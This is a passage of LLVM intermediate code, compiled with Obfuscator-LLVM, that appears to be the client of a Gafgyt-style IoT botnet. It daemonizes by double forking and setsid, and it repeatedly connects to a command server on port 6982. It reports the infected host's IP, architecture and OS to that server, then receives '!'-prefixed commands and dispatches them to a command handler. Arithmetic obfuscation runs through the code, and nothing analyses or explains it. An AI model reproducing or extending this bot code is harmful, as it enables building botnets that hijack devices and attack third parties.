  %594 = load i32, i32* %593, align 4
  %595 = icmp ne i32 %594, 0
  br i1 %595, label %596, label %615

; <label>:596:                                    ; preds = %590
  %597 = load i32*, i32** @pids, align 8
  %598 = load i64, i64* %37, align 8
  %599 = getelementptr inbounds i32, i32* %597, i64 %598
  %600 = load i32, i32* %599, align 4
  %601 = call i32 @getpid() #6
  %602 = icmp ne i32 %600, %601
  br i1 %602, label %603, label %615

; <label>:603:                                    ; preds = %596
  %604 = load i32*, i32** @pids, align 8
  %605 = load i64, i64* %37, align 8
  %606 = getelementptr inbounds i32, i32* %604, i64 %605
  %607 = load i32, i32* %606, align 4
  %608 = call i32 @kill(i32 %607, i32 9) #6
  %609 = load i32, i32* %36, align 4
  %610 = sub i32 0, %609
  %611 = sub i32 0, 1
  %612 = add i32 %610, %611
  %613 = sub i32 0, %612
  %614 = add nsw i32 %609, 1
  store i32 %613, i32* %36, align 4
  br label %615

; <label>:615:                                    ; preds = %603, %596, %590
  br label %616

; <label>:616:                                    ; preds = %615
  %617 = load i64, i64* %37, align 8
  %618 = sub i64 0, %617
  %619 = sub i64 0, 1
  %620 = add i64 %618, %619
  %621 = sub i64 0, %620
  %622 = add i64 %617, 1
  store i64 %621, i64* %37, align 8
  br label %586

; <label>:623:                                    ; preds = %586
  %624 = load i32, i32* %36, align 4
  %625 = icmp sgt i32 %624, 0
  br i1 %625, label %626, label %627

; <label>:626:                                    ; preds = %623
  br label %628

; <label>:627:                                    ; preds = %623
  br label %628

; <label>:628:                                    ; preds = %627, %626
  br label %629

; <label>:629:                                    ; preds = %628, %579, %573, %536, %494, %417, %341, %273, %216, %181, %149, %91
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #5

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = sub i32 0, 1
  %13 = sub i32 %11, %12
  %14 = add nsw i32 %11, 1
  %15 = sext i32 %13 to i64
  %16 = icmp eq i64 %15, 1
  br i1 %16, label %17, label %18

; <label>:17:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %24

; <label>:18:                                     ; preds = %10
  %19 = load i32, i32* @currentServer, align 4
  %20 = add i32 %19, -707615412
  %21 = add i32 %20, 1
  %22 = sub i32 %21, -707615412
  %23 = add nsw i32 %19, 1
  store i32 %22, i32* @currentServer, align 4
  br label %24

; <label>:24:                                     ; preds = %18, %17
  %25 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %26 = load i32, i32* @currentServer, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %27
  %29 = load i8*, i8** %28, align 8
  %30 = call i8* @strcpy(i8* %25, i8* %29) #6
  store i32 6982, i32* %3, align 4
  %31 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %32 = call i8* @strchr(i8* %31, i32 58) #10
  %33 = icmp ne i8* %32, null
  br i1 %33, label %34, label %41

; <label>:34:                                     ; preds = %24
  %35 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %36 = call i8* @strchr(i8* %35, i32 58) #10
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = call i32 @atoi(i8* %37) #10
  store i32 %38, i32* %3, align 4
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %40 = call i8* @strchr(i8* %39, i32 58) #10
  store i8 0, i8* %40, align 1
  br label %41

; <label>:41:                                     ; preds = %34, %24
  %42 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %42, i32* @mainCommSock, align 4
  %43 = load i32, i32* @mainCommSock, align 4
  %44 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %45 = load i32, i32* %3, align 4
  %46 = call i32 @connectTimeout(i32 %43, i8* %44, i32 %45, i32 30)
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %49, label %48

; <label>:48:                                     ; preds = %41
  store i32 1, i32* %1, align 4
  br label %50

; <label>:49:                                     ; preds = %41
  store i32 0, i32* %1, align 4
  br label %50

; <label>:50:                                     ; preds = %49, %48
  %51 = load i32, i32* %1, align 4
  ret i32 %51
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [4096 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca [10 x i8*], align 16
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %22 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %23 = call i32 @getpid() #6
  %24 = xor i32 %22, -1
  %25 = and i32 968503905, %24
  %26 = xor i32 968503905, -1
  %27 = and i32 %22, %26
  %28 = xor i32 %23, -1
  %29 = and i32 %28, 968503905
  %30 = and i32 %23, %26
  %31 = or i32 %25, %27
  %32 = or i32 %29, %30
  %33 = xor i32 %31, %32
  %34 = xor i32 %22, %23
  call void @srand(i32 %33) #6
  %35 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %36 = call i32 @getpid() #6
  %37 = xor i32 %35, -1
  %38 = and i32 1515997682, %37
  %39 = xor i32 1515997682, -1
  %40 = and i32 %35, %39
  %41 = xor i32 %36, -1
  %42 = and i32 %41, 1515997682
  %43 = and i32 %36, %39
  %44 = or i32 %38, %40
  %45 = or i32 %42, %43
  %46 = xor i32 %44, %45
  %47 = xor i32 %35, %36
  call void @init_rand(i32 %46)
  %48 = call i32 @getOurIP()
  %49 = call i32 @fork() #6
  store i32 %49, i32* %6, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %2
  %52 = load i32, i32* %6, align 4
  %53 = call i32 @waitpid(i32 %52, i32* %8, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:54:                                     ; preds = %2
  %55 = load i32, i32* %6, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %68, label %57

; <label>:57:                                     ; preds = %54
  %58 = call i32 @fork() #6
  store i32 %58, i32* %7, align 4
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %61

; <label>:60:                                     ; preds = %57
  call void @exit(i32 0) #12
  unreachable

; <label>:61:                                     ; preds = %57
  %62 = load i32, i32* %7, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %65, label %64

; <label>:64:                                     ; preds = %61
  br label %66

; <label>:65:                                     ; preds = %61
  br label %66

; <label>:66:                                     ; preds = %65, %64
  br label %67

; <label>:67:                                     ; preds = %66
  br label %69

; <label>:68:                                     ; preds = %54
  br label %69

; <label>:69:                                     ; preds = %68, %67
  br label %70

; <label>:70:                                     ; preds = %69
  %71 = call i32 @setsid() #6
  %72 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #6
  %73 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #6
  br label %74

; <label>:74:                                     ; preds = %376, %77, %70
  %75 = call i32 @initConnection()
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %79

; <label>:77:                                     ; preds = %74
  %78 = call i32 @sleep(i32 5)
  br label %74

; <label>:79:                                     ; preds = %74
  %80 = load i32, i32* @mainCommSock, align 4
  %81 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %82 = call i8* @inet_ntoa(i32 %81) #6
  %83 = call i8* @getPortz()
  %84 = call i8* @getBuildz()
  %85 = call i8* @getArch()
  %86 = call i8* @getOS()
  %87 = call i32 (i32, i8*, ...) @sockprintf(i32 %80, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.39, i32 0, i32 0), i8* %82, i8* %83, i8* %84, i8* %85, i8* %86)
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  br label %88

; <label>:88:                                     ; preds = %375, %225, %79
  %89 = load i32, i32* @mainCommSock, align 4
  %90 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  %91 = call i32 @recvLine(i32 %89, i8* %90, i32 4096)
  store i32 %91, i32* %10, align 4
  %92 = icmp ne i32 %91, -1
  br i1 %92, label %93, label %376

; <label>:93:                                     ; preds = %88
  store i32 0, i32* %11, align 4
  br label %94

; <label>:94:                                     ; preds = %185, %93
  %95 = load i32, i32* %11, align 4
  %96 = sext i32 %95 to i64
  %97 = load i64, i64* @numpids, align 8
  %98 = icmp ult i64 %96, %97
  br i1 %98, label %99, label %192

; <label>:99:                                     ; preds = %94
  %100 = load i32*, i32** @pids, align 8
  %101 = load i32, i32* %11, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i32, i32* %100, i64 %102
  %104 = load i32, i32* %103, align 4
  %105 = call i32 @waitpid(i32 %104, i32* null, i32 1)
  %106 = icmp sgt i32 %105, 0
  br i1 %106, label %107, label %184

; <label>:107:                                    ; preds = %99
  %108 = load i32, i32* %11, align 4
  %109 = sub i32 0, 1
  %110 = sub i32 %108, %109
  %111 = add nsw i32 %108, 1
  store i32 %110, i32* %13, align 4
  br label %112

; <label>:112:                                    ; preds = %130, %107
  %113 = load i32, i32* %13, align 4
  %114 = zext i32 %113 to i64
  %115 = load i64, i64* @numpids, align 8
  %116 = icmp ult i64 %114, %115
  br i1 %116, label %117, label %136

; <label>:117:                                    ; preds = %112
  %118 = load i32*, i32** @pids, align 8
  %119 = load i32, i32* %13, align 4
  %120 = zext i32 %119 to i64
  %121 = getelementptr inbounds i32, i32* %118, i64 %120
  %122 = load i32, i32* %121, align 4
  %123 = load i32*, i32** @pids, align 8
  %124 = load i32, i32* %13, align 4
  %125 = sub i32 0, 1
  %126 = add i32 %124, %125
  %127 = sub i32 %124, 1
  %128 = zext i32 %126 to i64
  %129 = getelementptr inbounds i32, i32* %123, i64 %128
  store i32 %122, i32* %129, align 4
  br label %130

; <label>:130:                                    ; preds = %117
  %131 = load i32, i32* %13, align 4
  %132 = add i32 %131, -2101123894
  %133 = add i32 %132, 1
  %134 = sub i32 %133, -2101123894
  %135 = add i32 %131, 1
  store i32 %134, i32* %13, align 4
  br label %112

; <label>:136:                                    ; preds = %112
  %137 = load i32*, i32** @pids, align 8
  %138 = load i32, i32* %13, align 4
  %139 = sub i32 %138, 744647168
  %140 = sub i32 %139, 1
  %141 = add i32 %140, 744647168
  %142 = sub i32 %138, 1
  %143 = zext i32 %141 to i64
  %144 = getelementptr inbounds i32, i32* %137, i64 %143
  store i32 0, i32* %144, align 4
  %145 = load i64, i64* @numpids, align 8
  %146 = add i64 %145, 1781004419699127733
  %147 = add i64 %146, -1
  %148 = sub i64 %147, 1781004419699127733
  %149 = add i64 %145, -1
  store i64 %148, i64* @numpids, align 8
  %150 = load i64, i64* @numpids, align 8
  %151 = add i64 %150, -5279439588689528513
  %152 = add i64 %151, 1
  %153 = sub i64 %152, -5279439588689528513
  %154 = add i64 %150, 1
  %155 = mul i64 %153, 4
  %156 = call noalias i8* @malloc(i64 %155) #6
  %157 = bitcast i8* %156 to i32*
  store i32* %157, i32** %12, align 8
  store i32 0, i32* %13, align 4
  br label %158

; <label>:158:                                    ; preds = %173, %136
  %159 = load i32, i32* %13, align 4
  %160 = zext i32 %159 to i64
  %161 = load i64, i64* @numpids, align 8
  %162 = icmp ult i64 %160, %161
  br i1 %162, label %163, label %180

; <label>:163:                                    ; preds = %158
  %164 = load i32*, i32** @pids, align 8
  %165 = load i32, i32* %13, align 4
  %166 = zext i32 %165 to i64
  %167 = getelementptr inbounds i32, i32* %164, i64 %166
  %168 = load i32, i32* %167, align 4
  %169 = load i32*, i32** %12, align 8
  %170 = load i32, i32* %13, align 4
  %171 = zext i32 %170 to i64
  %172 = getelementptr inbounds i32, i32* %169, i64 %171
  store i32 %168, i32* %172, align 4
  br label %173

; <label>:173:                                    ; preds = %163
  %174 = load i32, i32* %13, align 4
  %175 = sub i32 0, %174
  %176 = sub i32 0, 1
  %177 = add i32 %175, %176
  %178 = sub i32 0, %177
  %179 = add i32 %174, 1
  store i32 %178, i32* %13, align 4
  br label %158

; <label>:180:                                    ; preds = %158
  %181 = load i32*, i32** @pids, align 8
  %182 = bitcast i32* %181 to i8*
  call void @free(i8* %182) #6
  %183 = load i32*, i32** %12, align 8
  store i32* %183, i32** @pids, align 8
  br label %184

; <label>:184:                                    ; preds = %180, %99
  br label %185

; <label>:185:                                    ; preds = %184
  %186 = load i32, i32* %11, align 4
  %187 = sub i32 0, %186
  %188 = sub i32 0, 1
  %189 = add i32 %187, %188
  %190 = sub i32 0, %189
  %191 = add nsw i32 %186, 1
  store i32 %190, i32* %11, align 4
  br label %94

; <label>:192:                                    ; preds = %94
  %193 = load i32, i32* %10, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %194
  store i8 0, i8* %195, align 1
  %196 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  call void @trim(i8* %196)
  %197 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  store i8* %197, i8** %14, align 8
  %198 = load i8*, i8** %14, align 8
  %199 = load i8, i8* %198, align 1
  %200 = zext i8 %199 to i32
  %201 = icmp eq i32 %200, 33
  br i1 %201, label %202, label %375

; <label>:202:                                    ; preds = %192
  %203 = load i8*, i8** %14, align 8
  %204 = getelementptr inbounds i8, i8* %203, i64 1
  store i8* %204, i8** %15, align 8
  br label %205

; <label>:205:                                    ; preds = %217, %202
  %206 = load i8*, i8** %15, align 8
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp ne i32 %208, 32
  br i1 %209, label %210, label %215

; <label>:210:                                    ; preds = %205
  %211 = load i8*, i8** %15, align 8
  %212 = load i8, i8* %211, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp ne i32 %213, 0
  br label %215

; <label>:215:                                    ; preds = %210, %205
  %216 = phi i1 [ false, %205 ], [ %214, %210 ]
  br i1 %216, label %217, label %220

; <label>:217:                                    ; preds = %215
  %218 = load i8*, i8** %15, align 8
  %219 = getelementptr inbounds i8, i8* %218, i32 1
  store i8* %219, i8** %15, align 8
  br label %205

; <label>:220:                                    ; preds = %215
  %221 = load i8*, i8** %15, align 8
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 0
  br i1 %224, label %225, label %226

; <label>:225:                                    ; preds = %220
  br label %88

; <label>:226:                                    ; preds = %220
  %227 = load i8*, i8** %15, align 8
  store i8 0, i8* %227, align 1
  %228 = load i8*, i8** %14, align 8
  %229 = getelementptr inbounds i8, i8* %228, i64 1
  store i8* %229, i8** %15, align 8
  %230 = load i8*, i8** %14, align 8
  %231 = load i8*, i8** %15, align 8
  %232 = call i64 @strlen(i8* %231) #10
  %233 = getelementptr inbounds i8, i8* %230, i64 %232
  %234 = getelementptr inbounds i8, i8* %233, i64 2
  store i8* %234, i8** %14, align 8
  br label %235

; <label>:235:                                    ; preds = %260, %226
  %236 = load i8*, i8** %14, align 8
  %237 = load i8*, i8** %14, align 8
  %238 = call i64 @strlen(i8* %237) #10
  %239 = add i64 %238, 7277789357255086729
  %240 = sub i64 %239, 1
  %241 = sub i64 %240, 7277789357255086729
  %242 = sub i64 %238, 1
  %243 = getelementptr inbounds i8, i8* %236, i64 %241
  %244 = load i8, i8* %243, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp eq i32 %245, 10
  br i1 %246, label %258, label %247

; <label>:247:                                    ; preds = %235
  %248 = load i8*, i8** %14, align 8
  %249 = load i8*, i8** %14, align 8
  %250 = call i64 @strlen(i8* %249) #10
  %251 = sub i64 0, 1
  %252 = add i64 %250, %251
  %253 = sub i64 %250, 1
  %254 = getelementptr inbounds i8, i8* %248, i64 %252
  %255 = load i8, i8* %254, align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 13
  br label %258

; <label>:258:                                    ; preds = %247, %235
  %259 = phi i1 [ true, %235 ], [ %257, %247 ]
  br i1 %259, label %260, label %269

; <label>:260:                                    ; preds = %258
  %261 = load i8*, i8** %14, align 8
  %262 = load i8*, i8** %14, align 8
  %263 = call i64 @strlen(i8* %262) #10
  %264 = add i64 %263, -7543050789743569041
  %265 = sub i64 %264, 1
  %266 = sub i64 %265, -7543050789743569041
  %267 = sub i64 %263, 1
  %268 = getelementptr inbounds i8, i8* %261, i64 %266
  store i8 0, i8* %268, align 1
  br label %235

; <label>:269:                                    ; preds = %258
  %270 = load i8*, i8** %14, align 8
  store i8* %270, i8** %16, align 8
  br label %271

; <label>:271:                                    ; preds = %283, %269
  %272 = load i8*, i8** %14, align 8
  %273 = load i8, i8* %272, align 1
  %274 = zext i8 %273 to i32
  %275 = icmp ne i32 %274, 32
  br i1 %275, label %276, label %281

; <label>:276:                                    ; preds = %271
  %277 = load i8*, i8** %14, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  %280 = icmp ne i32 %279, 0
  br label %281

; <label>:281:                                    ; preds = %276, %271
  %282 = phi i1 [ false, %271 ], [ %280, %276 ]
  br i1 %282, label %283, label %286

; <label>:283:                                    ; preds = %281
  %284 = load i8*, i8** %14, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %14, align 8
  br label %271

; <label>:286:                                    ; preds = %281
  %287 = load i8*, i8** %14, align 8
  store i8 0, i8* %287, align 1
  %288 = load i8*, i8** %14, align 8
  %289 = getelementptr inbounds i8, i8* %288, i32 1
  store i8* %289, i8** %14, align 8
  %290 = load i8*, i8** %16, align 8
  store i8* %290, i8** %17, align 8
  br label %291

; <label>:291:                                    ; preds = %295, %286
  %292 = load i8*, i8** %17, align 8
  %293 = load i8, i8* %292, align 1
  %294 = icmp ne i8 %293, 0
  br i1 %294, label %295, label %304

; <label>:295:                                    ; preds = %291
  %296 = load i8*, i8** %17, align 8
  %297 = load i8, i8* %296, align 1
  %298 = zext i8 %297 to i32
  %299 = call i32 @toupper(i32 %298) #10
  %300 = trunc i32 %299 to i8
  %301 = load i8*, i8** %17, align 8
  store i8 %300, i8* %301, align 1
  %302 = load i8*, i8** %17, align 8
  %303 = getelementptr inbounds i8, i8* %302, i32 1
  store i8* %303, i8** %17, align 8
  br label %291

; <label>:304:                                    ; preds = %291
  store i32 1, i32* %19, align 4
  %305 = load i8*, i8** %14, align 8
  %306 = call i8* @strtok(i8* %305, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0)) #6
  store i8* %306, i8** %20, align 8
  %307 = load i8*, i8** %16, align 8
  %308 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 0
  store i8* %307, i8** %308, align 16
  br label %309

; <label>:309:                                    ; preds = %349, %304
  %310 = load i8*, i8** %20, align 8
  %311 = icmp ne i8* %310, null
  br i1 %311, label %312, label %351

; <label>:312:                                    ; preds = %309
  %313 = load i8*, i8** %20, align 8
  %314 = load i8, i8* %313, align 1
  %315 = zext i8 %314 to i32
  %316 = icmp ne i32 %315, 10
  br i1 %316, label %317, label %349

; <label>:317:                                    ; preds = %312
  %318 = load i8*, i8** %20, align 8
  %319 = call i64 @strlen(i8* %318) #10
  %320 = sub i64 0, 1
  %321 = sub i64 %319, %320
  %322 = add i64 %319, 1
  %323 = call noalias i8* @malloc(i64 %321) #6
  %324 = load i32, i32* %19, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %325
  store i8* %323, i8** %326, align 8
  %327 = load i32, i32* %19, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %328
  %330 = load i8*, i8** %329, align 8
  %331 = load i8*, i8** %20, align 8
  %332 = call i64 @strlen(i8* %331) #10
  %333 = sub i64 0, %332
  %334 = sub i64 0, 1
  %335 = add i64 %333, %334
  %336 = sub i64 0, %335
  %337 = add i64 %332, 1
  call void @llvm.memset.p0i8.i64(i8* %330, i8 0, i64 %336, i32 1, i1 false)
  %338 = load i32, i32* %19, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %339
  %341 = load i8*, i8** %340, align 8
  %342 = load i8*, i8** %20, align 8
  %343 = call i8* @strcpy(i8* %341, i8* %342) #6
  %344 = load i32, i32* %19, align 4
  %345 = sub i32 %344, 1433950502
  %346 = add i32 %345, 1
  %347 = add i32 %346, 1433950502
  %348 = add nsw i32 %344, 1
  store i32 %347, i32* %19, align 4
  br label %349

; <label>:349:                                    ; preds = %317, %312
  %350 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0)) #6
  store i8* %350, i8** %20, align 8
  br label %309

; <label>:351:                                    ; preds = %309
  %352 = load i32, i32* %19, align 4
  %353 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i32 0, i32 0
  call void @processCmd(i32 %352, i8** %353)
  %354 = load i32, i32* %19, align 4
  %355 = icmp sgt i32 %354, 1
  br i1 %355, label %356, label %374

; <label>:356:                                    ; preds = %351
  store i32 1, i32* %21, align 4
  store i32 1, i32* %21, align 4
  br label %357

; <label>:357:                                    ; preds = %366, %356
  %358 = load i32, i32* %21, align 4
  %359 = load i32, i32* %19, align 4
  %360 = icmp slt i32 %358, %359
  br i1 %360, label %361, label %373

; <label>:361:                                    ; preds = %357
  %362 = load i32, i32* %21, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds [10 x i8*], [10 x i8*]* %18, i64 0, i64 %363
  %365 = load i8*, i8** %364, align 8
  call void @free(i8* %365) #6
  br label %366

; <label>:366:                                    ; preds = %361
  %367 = load i32, i32* %21, align 4
  %368 = sub i32 0, %367
  %369 = sub i32 0, 1
  %370 = add i32 %368, %369
  %371 = sub i32 0, %370
  %372 = add nsw i32 %367, 1
  store i32 %371, i32* %21, align 4
  br label %357

; <label>:373:                                    ; preds = %357
  br label %374

; <label>:374:                                    ; preds = %373, %351
  br label %375

; <label>:375:                                    ; preds = %374, %192
  br label %88

; <label>:376:                                    ; preds = %88
  br label %74
                                                  ; No predecessors!
  %378 = load i32, i32* %3, align 4
  ret i32 %378
}

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: nounwind
declare i32 @setsid() #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readnone }
attributes #10 = { nounwind readonly }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146660393}
!2 = !{i32 -2146659702}
!3 = !{i32 -2146658953}
